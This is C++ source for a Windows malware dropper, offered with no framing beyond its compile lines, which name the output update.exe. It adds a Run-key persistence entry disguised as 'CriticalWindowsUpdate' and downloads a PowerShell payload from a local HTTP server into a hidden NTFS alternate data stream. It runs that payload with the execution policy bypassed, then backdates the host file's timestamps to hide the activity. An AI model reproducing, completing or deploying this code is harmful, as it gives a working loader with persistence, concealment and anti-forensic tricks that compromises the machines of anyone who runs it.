// Compile with: cl.exe dropper.cpp /link /SUBSYSTEM:WINDOWS user32.lib wininet.lib advapi32.lib
// Compile with: gcc dropper.cpp -o update.exe -lwininet
#include <windows.h>
#include <wininet.h>
#include <cstdio> // or #include <stdio.h>
#include <ostream>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "Crypt32.lib")


void SetPersistence() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "CriticalWindowsUpdate";
    char exePath[MAX_PATH];
    GetModuleFileNameA(
        NULL, 
        exePath, 
        MAX_PATH
    );
    RegOpenKeyExA(
        HKEY_CURRENT_USER, 
        regPath, 
        0, 
        KEY_SET_VALUE, 
        &hKey
    );
    RegSetValueExA(
        hKey, 
        valueName, 
        0, 
        REG_SZ, 
        (const BYTE*)exePath, 
        strlen(exePath)
    );
    RegCloseKey(hKey);
}

void DownloadAndAddToADS() {
    HINTERNET hInternet, hUrl;
    char payloadBuffer[4096];
    DWORD bytesRead;
    
    const char* payloadUrl = "http://127.0.0.1:8000/payload.ps1";
    const char* droppedFilePath = "C:\\Users\\Public\\payload.ps1";
    const char* host = "C:\\Users\\Public\\a.txt";       
    const char* streamName = "secret.ps1";         
    const char* adsPath = "C:\\Users\\Public\\a.txt:secret.ps1"; 

    hInternet = InternetOpenA(
        "Mozilla/5.0", 
        INTERNET_OPEN_TYPE_PRECONFIG, 
        NULL, 
        NULL, 
        0
    );
    hUrl = InternetOpenUrlA(
        hInternet, 
        payloadUrl, 
        NULL, 
        0, 
        INTERNET_FLAG_RELOAD, 
        0
    );
    HANDLE hHost = CreateFileA(
        host,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_ALWAYS,             
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    HANDLE hAds = CreateFileA(
        adsPath,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,           
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hUrl) {
        while (InternetReadFile(hUrl, payloadBuffer, sizeof(payloadBuffer), &bytesRead) && bytesRead > 0) {
            DWORD bytesWritten;
            WriteFile(hAds, payloadBuffer, bytesRead, &bytesWritten, NULL);
        }
    }
    CloseHandle(hHost);
    CloseHandle(hAds);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    char commandLine[MAX_PATH + 50];
    snprintf(commandLine, sizeof(commandLine), "cmd /c /q powershell -ep bypass - < %s", adsPath);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA(
        NULL, 
        commandLine, 
        NULL, 
        NULL, 
        FALSE, 
        0, 
        NULL, 
        NULL, 
        &si, 
        &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void ChangeCreateTime(){
    const char* filePath = "C:\\Users\\Public\\a.txt"; 
    SYSTEMTIME newTime;
    newTime.wYear = 2025;
    newTime.wMonth = 1;
    newTime.wDay = 15;
    newTime.wHour = 10;
    newTime.wMinute = 30;
    newTime.wSecond = 0;
    FILETIME nTime;
    SystemTimeToFileTime(&newTime,&nTime);
    HANDLE hFile = CreateFileA(
        filePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_ALWAYS,             
        FILE_ATTRIBUTE_NORMAL,
        NULL
    
    );
    SetFileTime(hFile, &nTime, &nTime, &nTime);

}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    SetPersistence();
    DownloadAndAddToADS();
    ChangeCreateTime();
    return 0;
}
